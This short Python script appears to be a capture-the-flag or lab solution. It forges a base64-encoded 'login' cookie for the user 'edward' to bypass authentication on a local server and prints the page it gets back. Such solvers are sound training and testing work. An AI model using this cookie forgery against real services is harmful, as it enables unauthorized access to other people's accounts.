import base64
import requests


def make_login_session():
    s = requests.Session()
    s.cookies['login'] = base64.b64encode('edward'.encode()).decode()
    return s


def solve(server_addr):
    s = make_login_session()
    response = s.get(server_addr + '/')
    print(response.text)


if __name__ == '__main__':
    solve('http://localhost:8000')
